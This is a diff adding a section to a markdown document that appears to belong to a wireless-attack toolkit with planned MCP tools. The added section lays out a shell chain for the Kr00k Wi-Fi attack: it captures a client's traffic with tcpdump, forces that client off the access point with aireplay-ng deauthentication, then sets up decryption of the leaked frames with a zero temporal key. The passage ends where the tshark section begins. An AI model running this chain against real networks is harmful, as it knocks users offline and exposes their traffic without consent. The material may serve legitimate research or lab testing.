@@ -49,6 +49,31 @@ run_sequence([
 ])
 ```
 
+## MCP mapping / fallback
+
+None of `capture_start`, `disassoc_targeted`, `capture_stop`, or
+`wireshark_decrypt_zero_key` exist in `src/` yet. Use the shell
+fallback below; each step maps to a concrete tool.
+
+**Fallback shell chain:**
+
+```bash
+# 1. capture on the client's channel (replaces capture_start)
+sudo tcpdump -i wlan1mon -w /tmp/kr00k.pcapng \
+    "wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66" &
+CAP_PID=$!
+
+# 2. force a disassoc (replaces disassoc_targeted) — reason 8, from the AP
+sudo aireplay-ng --disassoc 5 -a AA:BB:CC:DD:EE:FF \
+    -c 11:22:33:44:55:66 wlan1mon
+
+# 3. let the tail land, then stop
+sleep 5
+sudo kill "$CAP_PID"
+
+# 4. decrypt with a zero TK (replaces wireshark_decrypt_zero_key) — see tshark below
+```
+
 ## Manual decrypt (tshark)
 
 Kr00k zeroes the **TK** (temporal key), not the PMK/PSK. Use tshark
